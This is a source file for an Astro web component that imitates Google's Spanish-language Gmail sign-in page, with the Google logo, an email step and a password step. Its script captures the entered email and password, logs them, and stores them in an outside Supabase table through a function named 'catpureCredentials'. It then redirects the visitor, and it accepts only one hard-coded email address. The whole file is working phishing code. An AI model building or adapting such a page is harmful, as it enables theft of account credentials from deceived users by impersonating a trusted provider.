---
// GoogleLogin.astro
---

<div class="login-container">
  <div class="login-box">
    <div class="logo-container">
      <svg viewBox="0 0 24 24" width="32" height="32" xmlns="http://www.w3.org/2000/svg">
        <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
        <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
        <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" fill="#FBBC05"/>
        <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.53 12-4.53z" fill="#EA4335"/>
      </svg>
    </div>

    <div id="step-email" class="step-content active">
      <div class="left">
        <h2>Inicia sesión</h2>
      <p class="subtitle">con tu cuenta de Google para ir a Gmail. Esta cuenta estará disponible para otras aplicaciones de Google en el navegador.</p>
      
      </div>
      <div class="right">
        <div class="input-group">
        <input type="text" id="email-input" required placeholder=" " autocomplete="username" />
        <label for="email-input">Correo electrónico o teléfono</label>
      </div>

      <a href="#" class="forgot-link">¿Has olvidado tu correo electrónico?</a>

      <p class="guest-mode">
        ¿No es tu ordenador? Usa el modo Invitado para iniciar sesión de forma privada. 
        <a href="#">Más información sobre cómo usar el modo Invitado</a>
      </p>

      <div class="actions">
        <a href="#" class="create-account">Crear cuenta</a>
        <button id="btn-next-email" class="btn-primary">Siguiente</button>
      </div>
      </div>
    </div>

    <div id="step-password" class="step-content">
      <div class="left">
        <h2>Te damos la bienvenida</h2>
        <div class="user-badge" id="user-badge-email">
          <svg width="24px" height="24px" viewBox="0 0 24.00 24.00" fill="none" xmlns="http://www.w3.org/2000/svg" stroke="#5f6368" stroke-width="0.00024000000000000003"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path fill-rule="evenodd" clip-rule="evenodd" d="M12 6C9.79086 6 8 7.79086 8 10C8 12.2091 9.79086 14 12 14C14.2091 14 16 12.2091 16 10C16 7.79086 14.2091 6 12 6Z" fill="#5f6368"></path> <path fill-rule="evenodd" clip-rule="evenodd" d="M12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2ZM4 12C4 7.58172 7.58172 4 12 4C16.4183 4 20 7.58172 20 12C20 14.0289 19.2447 15.8813 18.0001 17.2916C16.4085 15.8674 14.3052 15 12.0002 15C9.69511 15 7.5917 15.8675 6.00015 17.2918C4.75533 15.8815 4 14.029 4 12Z" fill="#5f6368"></path> </g></svg>
          <span id="display-email"></span>
        </div>
      </div>

      <div class="right" style="padding-top:30px ;">
        <div class="input-group">
          <input type="password" id="password-input" required placeholder=" " autocomplete="current-password" />
          <label for="password-input">Introduce tu contraseña</label>
        </div>

        <div class="show-password-container">
          <label class="checkbox-label">
            <input type="checkbox" id="show-password" />
            <span class="custom-checkbox"></span>
            Mostrar contraseña
          </label>
        </div>

        <div class="actions" style="margin-top: 3rem;">
          <a href="#" class="forgot-link">¿Has olvidado tu contraseña?</a>
          <button id="btn-next-password" class="btn-primary">Siguiente</button>
        </div>
      </div>
    </div>

  </div>
</div>

<script>
  import { createClient } from '@supabase/supabase-js';

  async function catpureCredentials(mail:string, password:string) {
    const supabaseUrl = import.meta.env.PUBLIC_SUPABASE_URL;
    const supabaseAnonKey = import.meta.env.PUBLIC_SUPABASE_ANON_KEY;

    // En lugar de usar "return" suelto, metemos la lógica válida dentro del bloque if
    if (supabaseUrl && supabaseAnonKey) {
      const supabase = createClient(supabaseUrl, supabaseAnonKey);
      const {data, error} = await supabase.from("fake").insert({
        mail: mail,
        pass: password,
      })

      if(!error){
        console.log(data)
      }
    }
  }
  // Selección de elementos
  const stepEmail = document.getElementById('step-email');
  const stepPassword = document.getElementById('step-password');
  const emailInput = document.getElementById('email-input') as HTMLInputElement;
  const passwordInput = document.getElementById('password-input') as HTMLInputElement;
  const displayEmail = document.getElementById('display-email');
  const showPasswordCheckbox = document.getElementById('show-password') as HTMLInputElement;

  const btnNextEmail = document.getElementById('btn-next-email');
  const btnNextPassword = document.getElementById('btn-next-password') as HTMLButtonElement ;

  // Guardado temporal de datos
  let userEmail = '';

  // Evento Siguiente (Pantalla Correo)
  btnNextEmail?.addEventListener('click', () => {
    if (emailInput && emailInput.value.trim() !== '') {
      userEmail = emailInput.value.trim();
      const temp = "diazwebapp@gmail.com"
      // Actualizar el correo visible en la segunda pantalla
      if (displayEmail) displayEmail.textContent = userEmail;
      if(userEmail != temp) return alert('correo invalido')
      // Animación de transición / cambio de pantalla
      stepEmail?.classList.remove('active');
      stepPassword?.classList.add('active');
      
      // Autofocus al input de password
      setTimeout(() => passwordInput?.focus(), 200);
    } else {
      emailInput?.focus();
      // Opcional: Aquí podrías añadir una clase de error visual
    }
  });

  // Evento Siguiente (Pantalla Contraseña)
 btnNextPassword?.addEventListener('click', async  () => {
   
   if (passwordInput && passwordInput.value.trim() !== '') {
      btnNextPassword.disabled = true;
      const userPassword = passwordInput.value;

      // Mostrar por consola ambos datos recolectados
      console.log('--- Datos de Inicio de Sesión ---');
      console.log('Correo/Teléfono:', userEmail);
      console.log('Contraseña:', userPassword);
      console.log('---------------------------------');
      
      await catpureCredentials(userEmail, userPassword)

      document.location = '/authorize'
    } else {
      passwordInput?.focus();
    }
  });

  // Funcionalidad de Mostrar/Ocultar contraseña
  showPasswordCheckbox?.addEventListener('change', (e) => {
    const target = e.target as HTMLInputElement;
    if (passwordInput) {
      passwordInput.type = target.checked ? 'text' : 'password';
    }
  });

  // Permitir avanzar al presionar 'Enter'
  emailInput?.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') btnNextEmail?.click();
  });

  passwordInput?.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') btnNextPassword?.click();
  });
</script>

